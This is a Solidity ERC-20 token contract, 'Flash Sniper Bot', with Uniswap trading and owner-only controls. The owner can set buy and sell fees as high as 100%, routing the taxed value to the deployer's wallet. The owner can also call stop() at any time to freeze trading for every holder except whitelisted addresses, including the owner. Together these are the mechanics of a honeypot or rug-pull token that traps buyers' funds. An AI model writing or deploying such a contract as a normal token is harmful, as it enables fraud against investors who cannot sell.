contract Token is Context, IERC20, Ownable {
    using SafeMath for uint256;
    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) private _isExcludedFromFee;


    IUniswapV2Router02 private uniswapV2Router;
    address private uniswapV2Pair;
    bool public tradingEnabled = false;
    bool private inSwap = false;
    bool private swapEnabled = false;
    bool private open = true;


    string private constant _name = "Flash Sniper Bot";
    string private constant _symbol = unicode"FSB";
    uint8 private constant _decimals = 18;
    uint256 private constant _tTotal = 1000000 * 10**_decimals;
    uint256 public buyFees = 20;
    uint256 public sellFees = 20;
    
    uint256 _triggerAmountToSwap = _tTotal / 200;

    address payable private _taxWallet;

    uint256 public _maxWallet = _tTotal * 3 / 100;


    modifier lockTheSwap {
        inSwap = true;
        _;
        inSwap = false;
    }

    constructor () {
        uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());
        _taxWallet = payable(_msgSender());
        _balances[_msgSender()] = _tTotal;
        emit Transfer(address(0), _msgSender(), _tTotal);

        _isExcludedFromFee[owner()] = true;
        _isExcludedFromFee[address(this)] = true;
        _isExcludedFromFee[address(uniswapV2Router)] = true;
    }

    

    function _approve(address owner, address spender, uint256 amount) private {
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _transfer(address from, address to, uint256 amount) private {
        require(amount > 0, "Transfer amount must be greater than zero");
        uint256 taxAmount = 0;
        bool txInWhiteList = (_isExcludedFromFee[from] || _isExcludedFromFee[to]);
        if (!txInWhiteList) {
            require(tradingEnabled, "Trading is not started");

            if (from == uniswapV2Pair) {
                //buy
                require(balanceOf(to) + amount <= _maxWallet, "Exceeds the maxWalletSize."); //limit buy
                taxAmount = amount.mul(buyFees).div(100);
            }

            if (to == uniswapV2Pair ) {
                //sell
                taxAmount = amount.mul(sellFees).div(100);
            }

            if (!inSwap && to == uniswapV2Pair && swapEnabled && balanceOf(address(this)) > _triggerAmountToSwap) {
                doSwapBack(_triggerAmountToSwap);
            }
        }

        if(taxAmount > 0) {
            _balances[address(this)]=_balances[address(this)].add(taxAmount);
            emit Transfer(from, address(this),taxAmount);
        }

        _balances[from]=_balances[from].sub(amount);
        _balances[to]=_balances[to].add(amount.sub(taxAmount));
        emit Transfer(from, to, amount.sub(taxAmount));
    }
    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function doSwapBack(uint256 amount) private {
        bool success;
        swapTokensForEth(amount);
        (success, ) = address(_taxWallet).call{value: address(this).balance}("");
    }
    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function setTriggerAmountToSwap(uint amount) external onlyOwner {
        require(amount>0, "amount should not be zero");
        _triggerAmountToSwap = amount;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _tTotal;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    

    function swapTokensForEth(uint256 tokenAmount) private lockTheSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();
        _approve(address(this), address(uniswapV2Router), tokenAmount);
        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    function modifyBuyFees(uint256 newFee) external onlyOwner {
        require(newFee <= 100, "invalid new Fee");
        buyFees = newFee;
    }

    function modifySellFees(uint256 newFee) external onlyOwner {
        require(newFee <= 100, "invalid new Fee");
        sellFees = newFee;
    }

    function removeLimits() external onlyOwner {
        _maxWallet =_tTotal;
        buyFees = 3;
        sellFees = 3;
    }

    function  openTrading() external onlyOwner() {
        open = false;
        tradingEnabled = true;
        swapEnabled = true;
    }
     
    function isExcludedFromFee(address account) public view returns (bool) {
        return _isExcludedFromFee[account];
    }

    receive() external payable {}

    function manualBurn(uint256 amount) external returns (bool) {
        _transfer(address(msg.sender), address(0xdead), amount);
        return true;
    }
    function stop() external onlyOwner() {
        open = true;
        tradingEnabled = false;
        swapEnabled = false;
    }

    function getCirculatingSupplys() public returns (uint256) {
        uint256 ts = totalSupply();
        return ts.sub(balanceOf(address(0xdead))).sub(balanceOf(address(0x0)));
    }

    function removeRestrictionsToZero() external onlyOwner {
        _maxWallet =_tTotal;
        buyFees = 0;
        sellFees = 0;
    }

    

}
